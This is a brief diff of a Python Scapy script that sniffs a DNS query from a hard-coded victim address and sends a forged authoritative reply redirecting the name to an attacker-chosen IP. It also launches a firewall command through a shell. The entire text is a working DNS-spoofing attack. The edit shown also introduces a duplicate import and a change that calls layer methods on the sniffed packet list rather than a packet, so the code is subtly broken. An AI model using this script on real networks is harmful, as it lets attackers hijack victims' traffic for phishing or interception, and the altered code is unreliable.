@@ -1,4 +1,4 @@
-from scapy.all import sniff, srp, IP, DNS, DNSQR, Ether, UDP, DNSRR, sendp
+from scapy.all import sniff, srp, IP, DNS, DNSQR, Ether, UDP, DNSRR, sendp, DNSRR
 from subprocess import Popen, PIPE
 
 victimIP = "10.5.1.2"
@@ -9,7 +9,7 @@ Popen([firewall], shell=True, stdout=PIPE)
 
 
 packet=sniff(count=1, filter="udp and port 53 and host " + victimIP)
-if packet[0].haslayer(DNS) and packet[0].getlayer(DNS).qr==0:
+if packet.haslayer(DNS) and packet.getlayer(DNS).qr==0:
     spoof = ((Ether())/IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1,an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=gotoIP)))
     sendp(spoof, count=1)
     
